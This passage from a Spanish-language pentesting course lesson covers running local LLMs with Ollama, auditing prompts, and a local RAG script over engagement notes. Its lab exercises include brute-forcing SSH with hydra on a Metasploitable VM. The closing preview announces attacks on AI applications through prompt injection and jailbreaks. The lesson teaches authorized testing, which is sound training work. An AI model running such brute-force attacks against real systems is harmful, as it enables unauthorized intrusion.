Ollama serializa los requests por modelo por defecto. Para paralelizar, corre dos instancias del modelo (puertos distintos de `OLLAMA_HOST`) o acepta el comportamiento serializado y usa una cola. Para la mayoría de los workflows de pentest, serializado está bien.

### 12.4 Costo de la context window

`num_ctx` por encima de 8192 cuesta memoria de forma significativa. Si un prompt no necesita contexto largo, no subas `num_ctx`. Mide antes de afinar:

```python
import ollama, time
for ctx in (2048, 4096, 8192, 16384):
    t0 = time.time()
    ollama.generate(model="llama3:8b", prompt="hola",
                    options={"num_ctx": ctx, "num_predict": 8})
    print(ctx, f"{time.time()-t0:.2f}s")
```

## 13. Auditar qué vio el modelo local

Incluso un modelo local debería ser auditable. Durante un engagement quieres poder probar que un trozo específico de datos del cliente se mandó, o no se mandó, al modelo en un momento específico.

### 13.1 Logs del server de Ollama

Ollama escribe en `~/.ollama/logs/server.log` (Linux) con metadata del request:

```bash
tail -f ~/.ollama/logs/server.log
# 2026-03-12T09:14:07Z INF request api/generate model=llama3:8b prompt_tokens=1421
```

Se registran conteos de tokens del prompt y nombres de modelo; el texto del prompt no (por defecto). Alcanza para demostrar cuándo se usó un modelo, no qué se envió.

### 13.2 Un logger del lado cliente

Para una auditoría de verdad, registra los dos extremos tú mismo. Envuelve las llamadas a `ollama`:

```python
# ~/pentest-ai/audited_ollama.py
import ollama, json, hashlib, datetime, pathlib

LOG = pathlib.Path("audit.log.jsonl")

def audited_generate(model, prompt, **kw):
    ts = datetime.datetime.utcnow().isoformat() + "Z"
    prompt_hash = hashlib.sha256(prompt.encode()).hexdigest()[:16]
    resp = ollama.generate(model=model, prompt=prompt, **kw)
    LOG.open("a").write(json.dumps({
        "ts": ts, "model": model,
        "prompt_hash": prompt_hash,
        "prompt_len": len(prompt),
        "response_len": len(resp["response"]),
        "eval_count": resp.get("eval_count"),
    }) + "\n")
    return resp
```

Ahora cada llamada deja un recibo con timestamp. Si un cliente pregunta "¿metiste nuestro fuente en alguna IA?", puedes mostrar un log de hashes de prompt más la carpeta de textos de prompt que guardaste al lado.

### 13.3 Captura de red como cinturón y tirantes

Corre un `tcpdump` sobre `lo` filtrado al puerto 11434 durante las sesiones sensibles:

```bash
sudo tcpdump -i lo -w ollama-loopback.pcap 'port 11434'
```

Si puedes probar que el tráfico nunca salió del loopback, puedes probar que el modelo no vio nada por la red. Combinado con la regla de firewall de salida de la sección 1, eso es una historia de auditoría fuerte.

## 14. Ejemplo de trabajo completo — RAG de notas del engagement

Juntando las secciones anteriores, aquí hay una herramienta más completa de retrieval-augmented generation (RAG) que responde preguntas de pentest desde un directorio de tus propias notas de engagement, usando solo modelos locales.

### 14.1 El script

```python
# ~/pentest-ai/engagement_rag.py
"""
RAG de notas de engagement (solo local).

Uso:
  python3 engagement_rag.py index  ~/engagements/acme/notes
  python3 engagement_rag.py ask    "¿Qué encontramos sobre el JWT?"

Requiere: ollama, chromadb, python-dateutil.
Modelos:  llama3:8b, nomic-embed-text
"""
import chromadb
import ollama
import pathlib
import sys
import textwrap
import re
import hashlib
import datetime

DB_DIR = "./chroma.db"
COL = "engagement_notes"
EMBED_MODEL = "nomic-embed-text"
CHAT_MODEL = "llama3:8b"
CHUNK_CHARS = 1200
OVERLAP = 200

PII_PATTERNS = [
    (re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.-]+\b"), "[EMAIL]"),
    (re.compile(r"\b(?:\d[ -]?){13,19}\b"), "[PAN]"),
    (re.compile(r"\b\d{3}-\d{2}-\d{4}\b"), "[SSN]"),
]

SYSTEM_PROMPT = """Eres un asistente de penetration testing que responde las preguntas
del tester a partir de sus propias notas de engagement. Fundamenta cada respuesta en
los snippets de CONTEXT de abajo. Si la respuesta no está en el contexto, di
"no está en mis notas" y detente. Cita las fuentes por su índice [n]. No inventes
findings, CVE ni hosts."""

USER_TEMPLATE = """CONTEXT:
{context}

PREGUNTA:
{question}

RESPUESTA (fundamentada, cita índices [n]):"""


def redact(text: str) -> str:
    for pat, repl in PII_PATTERNS:
        text = pat.sub(repl, text)
    return text


def chunk(text: str):
    text = text.strip()
    i = 0
    while i < len(text):
        yield text[i:i + CHUNK_CHARS]
        i += CHUNK_CHARS - OVERLAP


def embed(text: str):
    return ollama.embeddings(model=EMBED_MODEL, prompt=text)["embedding"]


def get_col():
    client = chromadb.PersistentClient(path=DB_DIR)
    return client.get_or_create_collection(COL)


def index(root: str):
    col = get_col()
    root_p = pathlib.Path(root)
    if not root_p.exists():
        print(f"[!] {root} no existe", file=sys.stderr)
        sys.exit(2)
    count = 0
    for p in root_p.rglob("*"):
        if p.suffix.lower() not in {".md", ".txt", ".log"}:
            continue
        if p.stat().st_size == 0 or p.stat().st_size > 4_000_000:
            continue
        text = p.read_text(errors="ignore")
        # Incluso en local, redacta PII obvio antes de indexar.
        text = redact(text)
        for i, ch in enumerate(chunk(text)):
            uid = hashlib.sha256(f"{p}::{i}::{ch[:64]}".encode()).hexdigest()[:24]
            col.upsert(
                ids=[uid],
                embeddings=[embed(ch)],
                documents=[ch],
                metadatas=[{
                    "path": str(p),
                    "chunk": i,
                    "mtime": datetime.datetime.fromtimestamp(
                        p.stat().st_mtime).isoformat(),
                }],
            )
            count += 1
    print(f"[+] Se indexaron {count} chunks desde {root}")


def retrieve(question: str, k: int = 6):
    col = get_col()
    r = col.query(query_embeddings=[embed(question)], n_results=k)
    results = []
    for doc, meta, dist in zip(r["documents"][0], r["metadatas"][0], r["distances"][0]):
        results.append({
            "doc": doc, "path": meta["path"],
            "chunk": meta.get("chunk"), "dist": dist,
        })
    return results


def build_context(hits):
    lines = []
    for i, h in enumerate(hits, 1):
        snippet = h["doc"].strip().replace("\n", " ")
        lines.append(f"[{i}] ({h['path']}#chunk{h['chunk']}) {snippet}")
    return "\n\n".join(lines)


def ask(question: str):
    hits = retrieve(question)
    if not hits:
        print("no está en mis notas")
        return
    context = build_context(hits)
    prompt = USER_TEMPLATE.format(context=context, question=question)
    resp = ollama.chat(
        model=CHAT_MODEL,
        messages=[
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ],
        options={"temperature": 0.2, "num_ctx": 8192, "keep_alive": "10m"},
    )
    answer = resp["message"]["content"].strip()
    print(textwrap.fill(answer, width=90))
    print("\n--- fuentes ---")
    for i, h in enumerate(hits, 1):
        print(f"[{i}] {h['path']}#chunk{h['chunk']}  (d={h['dist']:.3f})")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    cmd = sys.argv[1]
    if cmd == "index":
        index(sys.argv[2])
    elif cmd == "ask":
        ask(" ".join(sys.argv[2:]))
    else:
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### 14.2 Recorrido

```bash
# Una vez: bajar los modelos
ollama pull llama3:8b
ollama pull nomic-embed-text

# Indexar una carpeta de engagement
python3 engagement_rag.py index ~/engagements/acme/notes
# [+] Se indexaron 431 chunks desde /home/kali/engagements/acme/notes

# Hacer una pregunta
python3 engagement_rag.py ask "¿Qué encontramos sobre el JWT en la API de admin?"
```

Output de muestra:

```text
En la API de admin en /admin/v2/api, las notas indican que el JWT se aceptó
con alg=none, lo que permite tokens forjados con claims arbitrarios. Se encontró
el 3 de marzo durante la segunda pasada sobre staging.acme.corp, usando la
extensión jwt-editor de Burp. El finding está archivado como ACME-2026-014,
severity High. [1][3]

--- fuentes ---
[1] /home/kali/engagements/acme/notes/day2-admin-api.md#chunk2  (d=0.184)
[2] /home/kali/engagements/acme/notes/scratch.md#chunk0         (d=0.201)
[3] /home/kali/engagements/acme/notes/findings/ACME-014.md#chunk1 (d=0.212)
```

Cada byte se quedó en la caja. El prompt quedó auditado por el wrapper de la sección 13 (agrégalo acá para trabajo de engagement). El vector store vive en la carpeta del engagement y se destruye al cierre.

### 14.3 Reglas de confiabilidad

- Fundamenta cada respuesta. El system prompt prohíbe respuestas que no estén en los snippets recuperados. Subir la temperature por encima de 0.3 empieza a producir fabricaciones plausibles; no lo hagas.
- Cita fuentes. Imprime siempre los paths recuperados debajo de la respuesta para poder saltar a la nota y leer el contexto de alrededor.
- Reindexa de noche. Las notas cambian; el índice no. Agrega un cron durante el engagement:

```cron
0 22 * * * /usr/bin/python3 ~/pentest-ai/engagement_rag.py index ~/engagements/acme/notes
```

## 15. Ejercicios

Todo lo de abajo asume un target autorizado e in scope. Usa VMs de prueba o un lab que sea tuyo si ahora no tienes un engagement en vivo.

### 15.1 Guiados

**Ejercicio 15.1.1 — Triage de nmap en un rango de lab.**

- Escanea un /24 de lab que sea tuyo con `nmap -sV -oX lab.xml 10.10.10.0/24`.
- Corre `nmap_triage.py lab.xml`.
- Compara las 5 prioridades más altas del modelo con las que elegirías a mano.
- Por cada desacuerdo, decide si el modelo se equivocó, si te equivocaste tú, o si las dos lecturas se defienden. Escribe dos oraciones que expliquen cada caso.

**Ejercicio 15.1.2 — Resumen de logs contra logs de Metasploitable.**

- En una VM Metasploitable, corre hydra contra SSH durante dos minutos con una wordlist chica.
- Copia `/var/log/auth.log` fuera de la VM.
- Alimenta las últimas 300 líneas a `log_summary.py`.
- Verifica la lista de IP del modelo contra `grep 'Failed password' auth.log | awk '{print $NF}' | sort -u`.

**Ejercicio 15.1.3 — Caza de sinks en una app vulnerable a propósito.**

- Clona OWASP Juice Shop en una carpeta.
- Corre `sink_hunter.py` sobre `routes/`.
- Elige los tres findings de arriba y verifica cada uno leyendo el path del código.
- Convierte un finding verificado en una report card con `finding_card.py`.

### 15.2 Independientes

**Ejercicio 15.2.1.** Conecta el filtro de redacción (`redact.py`) al pipeline de `http_analyze.py` para que el modelo nunca vea emails, JWT ni IP. Demuestra la diferencia capturando una respuesta de login y corriendo el pipeline dos veces, una con redacción y otra sin ella.

**Ejercicio 15.2.2.** Extiende `engagement_rag.py` con un subcomando `stats` que imprima la cantidad de chunks por archivo de notas y los 20 tokens principales por TF-IDF en el corpus. Usa solo la biblioteca estándar más `collections` y `math`.

**Ejercicio 15.2.3.** Monta el wrapper `audited_ollama.py` en todos tus scripts locales de pentest. Después corre un día normal de trabajo a través de ellos. Al final del día, produce un log firmado (`gpg --clearsign`) que resuma cada hash de prompt, modelo y hora. Considéralo un template del artefacto de auditoría que le entregarías a un cliente si lo pide.

## 16. Resumen y siguiente lección

La IA local no es un truco para pentesters. Quita la razón más grande por la que los profesionales de seguridad mantenían los LLM a distancia — el problema de confidencialidad — y habilita workflows que antes eran demasiado lentos o demasiado tediosos. Clustering de recon, triage de nmap, resumen de logs, análisis de transacciones HTTP, caza de sinks en código fuente, wordlists a medida, redacción de reports y RAG sobre tus propias notas de engagement son prácticos en una laptop de 16 GB de RAM y una hora de setup.

Las reglas que importan no cambiaron:

- Cada workflow asume un engagement autorizado e in scope.
- Cada modelo corre en tu caja. Ollama bindea a loopback; la salida hacia providers hosted está cortada por firewall.
- Cada prompt es auditable. Envuelve `ollama.generate` y guarda los recibos.
- Redacta PII antes del pipe, incluso en local.
- Verifica a mano cada finding del modelo. El modelo produce pistas, no prueba.

La siguiente lección — Lección 06: Prompt Injection, Jailbreaks y ataque a aplicaciones impulsadas por IA — da vuelta la perspectiva. Vas a jugar de atacante contra apps impulsadas por LLM: prompt injection a través de documentos y páginas, jailbreaks contra el entrenamiento de seguridad, inyección indirecta a través de stores de RAG (como el que acabamos de armar) y cómo demostrar impact real cuando el producto de un cliente incluye un LLM en el path del request.
